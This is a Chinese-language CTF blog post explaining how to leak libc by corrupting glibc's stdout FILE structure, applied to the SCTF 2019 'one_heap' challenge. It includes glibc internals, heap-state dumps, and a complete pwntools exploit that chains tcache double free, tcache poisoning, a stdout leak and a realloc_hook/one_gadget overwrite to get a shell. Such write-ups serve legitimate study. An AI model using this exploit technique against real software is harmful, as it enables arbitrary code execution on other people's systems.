---
layout: post
title:  "使用stdout泄露内存"
categories: pwn
tags: debug
excerpt: 使用stdout泄露内存
mathjax: true
---

* content
{:toc}

### Overview
做堆题目的时候经常碰到没有show函数的情况，这时还可以用修改stdout结构的方式泄露出我们想要的libc地址。这种方式也变成近些年比赛的常规操作了。

### 0x00原理
这项技术是通过修改stdout的结构体中的指针,使其输出更多数据，泄露出libc地址。

1. 概念
stdout 是一个_IO_FILE结构体, 每个_IO_FILE结构体都有如下结构，在本文中最关注的是 _flags 和 _IO_write_base , _IO_write_ptr .
只要控制好这三个变量，就可以利用如puts / printf 等stdio相关的函数中泄露内存

```
struct _IO_FILE_plus
{
    _IO_FILE    file;
    IO_jump_t   *vtable;
}
```
_IO_FILE_plus 就是_IO_FILE 外面多了一个vtable 里面有很多函数指针

```c
gdb-peda$ p *(struct _IO_FILE_plus *) stdout
$5 = {
  file = {
    _flags = 0xfbad2887,
    _IO_read_ptr = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7ffff7dd26a4 <_IO_2_1_stdout_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7dd18e0 <_IO_2_1_stdin_>,
    _fileno = 0x1,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "\n",
    _lock = 0x7ffff7dd3780 <_IO_stdfile_1_lock>,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd17a0 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7dd06e0 <_IO_file_jumps>
}

gdb-peda$ p *((struct _IO_FILE_plus *) stdout).vtable
$6 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7ffff7a869c0 <_IO_new_file_finish>,
  __overflow = 0x7ffff7a87730 <_IO_new_file_overflow>,
  __underflow = 0x7ffff7a874a0 <_IO_new_file_underflow>,
  __uflow = 0x7ffff7a88600 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7a89980 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7ffff7a861e0 <_IO_new_file_xsputn>,
  __xsgetn = 0x7ffff7a85ec0 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7ffff7a854c0 <_IO_new_file_seekoff>,
  __seekpos = 0x7ffff7a88a00 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7a85430 <_IO_new_file_setbuf>,
  __sync = 0x7ffff7a85370 <_IO_new_file_sync>,
  __doallocate = 0x7ffff7a7a180 <__GI__IO_file_doallocate>,
  __read = 0x7ffff7a861a0 <__GI__IO_file_read>,
  __write = 0x7ffff7a85b70 <_IO_new_file_write>,
  __seek = 0x7ffff7a85970 <__GI__IO_file_seek>,
  __close = 0x7ffff7a85340 <__GI__IO_file_close>,
  __stat = 0x7ffff7a85b60 <__GI__IO_file_stat>,
  __showmanyc = 0x7ffff7a89af0 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7a89b00 <_IO_default_imbue>
}

```
puts会将 _IO_write_base 和 _IO_write_ptr 区间内的数据输出,在输出之前_flags要满足一些要求
上面的 _flags = 0xfbad2887 是多个flag标志的集合,flag的定义在libio.h中,只例举我们用到的三个如下

```
#define _IO_MAGIC 0xFBAD0000 /* Magic number */
#define _IO_CURRENTLY_PUTTING 0x800
#define _IO_IS_APPENDING 0x1000
#define _IO_NO_WRITES 8 /* Writing not allowd */
```

2. puts程序流

_IO_puts => _IO_sputn => vtable 中的 __xsputn => _IO_new_file_xsputn => _IO_new_file_overflow

为了简化只写出需要设置flag的部分

```
int _IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) // 需要绕过
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) //需要绕过
    {
      ...
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,  f->_IO_write_ptr - f->_IO_write_base);
```

_IO_do_write => new_do_write

```
static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)  /* 需要满足 */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
     ............
    }
  count = _IO_SYSWRITE (fp, data, to_do); // 最终目标
```

经过以上流程，我们需要设置_flags为 0xfbad1800
```
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
```

### 漏洞利用思路

1. 在没有tcache时： 使用unsorted bin attack 写一个main_arena 地址到一个fastbin 的fd中
2. 有tcache时 ： 通过修改libc中的stdout的结构，进行泄露

    * 同时修改_IO_IS_APPENDING(0x1000)和_IO_CURRENTLY_PUTTING(0x800)标志位.
    * 同时修改_IO_CURRENTLY_PUTTING(0x800)标志位和stdout->_IO_write_base和stdout->_IO_read_end
    * stdout已经输出过，所以_IO_CURRENTLY_PUTTING标志位就是1，我们只要修改stdout->_IO_write_base和stdout->_IO_read_end指针

### SCTF-2019-oneheap

#### 1. 逆向分析
[题目链接](https://github.com/pwnkk/CTFs/tree/master/2019-SCTF/one_heap)

程序是堆题目，有tcache，功能上只有两个选项，保护全开,只有一个堆指针

* add: size小于0x7f
* free : free 后没有清空指针, 由于没有edit功能，这里就只能是double free(感谢tcache没有double free的check)，free次数限制4次
难点在于没有leak且free次数有限
* 程序保护全开

#### 2. 利用思路

问题1：没有show函数如何leak libc
* 通过覆盖stdout结构的方式进行泄露，需要一个main_arena 地址进行部分写申请到stdout ,但是在tcache的情况下需要free 7次填满tcache 后才能释放到unsorted bin 中获取到main_arena 地址,free 次数最多只有4次。

问题2：free次数不够如何构造unsorted bin 

* 修改count 创造unsorted bin
tcache_perthread_struct 是管理tcache的结构，其中维护了已有的tcache chunk 地址
```
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

double free 导致chunk的fd指向自己，形成了一个无限循环,当调用malloc时可以多次申请出同一个chunk，每次结构中count 就会减1。
如果两次free, 三次malloc就会导致count 变成0xff, 让程序误认为已经有很多tcache ，因此下一次free 直接放到unsorted bin中。

还需要注意，一旦放入unsorted bin 如果和top chunk 相邻就会合并，需要申请一个0x2f的chunk 防止合并，同时free掉放入tcache，准备下一次tcache poison使用。

```python
    new(0x7f,"a"*4)
    new(0x7f,"a"*4)
    de()
    de()

    new(0x2f,"") # 防止新unsorted bin 和topchunk合并
    de()

    new(0x7f,"")
    new(0x7f,"")
    new(0x7f,"")
    de()
``` 

堆情况如下

```
tcachebins
0x40 [  1]: 0x555555759380 ◂— 0x0
0x90 [ -1]: 0x5555557592f0 —▸ 0x7ffff7dcfca0 (main_arena+96)
unsortedbin
all: 0x5555557592e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555557592e0
```

此时chunk同时存在于tcache和unsorted bin 中，从unsorted bin 中分配堆块覆盖fd ，再使用tcache poisoning (类似UAF)

#### 3. 泄露地址

1. new chunk 修改fd为stdout地址，需要一点爆破 `\x60\x07\xdd`
此时tcache 中的entry 依然指向原来的地址
`0x90 [ -1]: 0x5555557592f0 —▸ 0x7ffff7dd0760 (_IO_2_1_stdout_)`

```python
new(0x20,"\x60\x07\xdd")
new(0x7f,p64(0)*5+p64(0xa1)) # 伪造size 合并下面的chunk
new(0x7f,p64(0xfbad1800)+p64(0)*3+'\x00')
```
修改flag为0xfbad1800 构造stdout leak,覆盖write_base 指针的最低字节为\x00,下一次输出就会把write_base 到write_ptr的内容输出出来。

#### 4. 攻击realloc_hook

使用之前tcache中的`0x40 [  1]: 0x555555759380 ◂— 0x0` , 修改位于0x555555759380 的entry 指向realloc_hook(在malloc_hook前面)

```
unsorted bin 
all: 0x555555759310 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555759310
```
二者距离0x60,申请0x68的chunk, 将0x555555759380 覆盖为realloc_hook
但是此时堆中可用size 最大是0x60,需要将这个chunk扩大,才能利用malloc 0x68 覆盖tcache中chunk的fd为realloc_hook

onegadget 直接覆盖malloc_hook 不好用, 需要将malloc_hook覆盖为realloc的地址,再将realloc_hook覆盖为onegadget,可以通过调整realloc 的地址来满足onegadget 的条件。 

![](https://github.com/pwnkk/pwnkk.github.io/raw/master/_posts/IMG/2019-10-31-leak_IO_stdout/oneheap.png)

#### Final

chunk 2f0即在unsorted bin 中又在tcache中，可以修改2f0两次：
* 第一次 malloc 0x20 修改fd为stdout 地址
* 第二次 malloc 0x7f 一是把tcache 中的chunk拿出来， 二是修改unsorted bin 的chunk size 使其满足申请0x68块(将原来的0x61改成0xa1)

在这道题中后面的堆布局稍微难理解一点,调试的时候把随机化关掉，再画一画图就好了。
据说有爆破更少的解法，有空再更，欢迎交流。

#### EXP

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
import os
debug = 0
exe = "./one_heap"

r = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x)
rud = lambda x:io.recvuntil(x,drop=True)
rul = lambda:io.recvline()
sd = lambda x:io.send(x)
sl = lambda x:io.sendline(x) 
sea = lambda x,y:io.sendafter(x,y)
sela = lambda x,y:io.sendlineafter(x,y)

context.terminal = ["tmux","splitw","-h"]
elf = ELF(exe)
context.arch = elf.arch

if debug:
    context.log_level = "debug"

arena64 = 0x3c4b20
arena32 = 0x1b2780

def dbg(breakpoint=0):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16)if elf.pie else 0 
    if breakpoint!=0:
        gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        gdb.attach(io, gdbscript)
        time.sleep(1)
    else:
        gdb.attach(io)

if len(sys.argv)>1:
    io = remote(sys.argv[1],int(sys.argv[2]))
    #libc = ELF("./libc.so.6")
else:
    #io = process(exe)
    libc = elf.libc

def new(size,content,line=1):
    sela(":","1")
    sela(":",str(size))
    if line==1:
        sela(":",content)
    else:
        sea(":",content)

def de():
    sela(":","2")

# double free tcache perthread corruption
def exp():
    global io
    io = process("./one_heap")
    new(0x7f,"a"*4)
    new(0x7f,"a"*4)
    de()
    de()
    
    new(0x2f,"") # 防止新unsorted bin 和topchunk合并
    de()

    new(0x7f,"")
    new(0x7f,"")
    new(0x7f,"")
    de()
    
    # 覆盖 0x7ffff7dd0760 <_IO_2_1_stdout_> 
    new(0x20,"\x60\x07\xdd")
    new(0x7f,p64(0)*5+p64(0xa1))
    new(0x7f,p64(0xfbad1800)+p64(0)*3+'\x00')
    try:
        if r(4)=="Done":
            return 
        else:
            pass
    except Exception as identifier:
        io.close()
        return

    ru("\x7f")
    libc.address = u64(ru("\x7f")[-6:].ljust(8,"\x00")) - 0x3eb780
    print hex(libc.address)
    one = libc.address+0x10a38c
    
    '''
    0x10a38c        execve("/bin/sh", rsp+0x70, environ)
    constraints:
    [rsp+0x70] == NULL
    '''
    # malloc_hook

    new(0x68, p64(0) * 12+p64(libc.symbols['__realloc_hook']),line=0)
    new(0x38,"")
    new(0x38,p64(one)+p64(libc.symbols["realloc"]+4))
    new(0x30,"")
    io.interactive()

exp()
```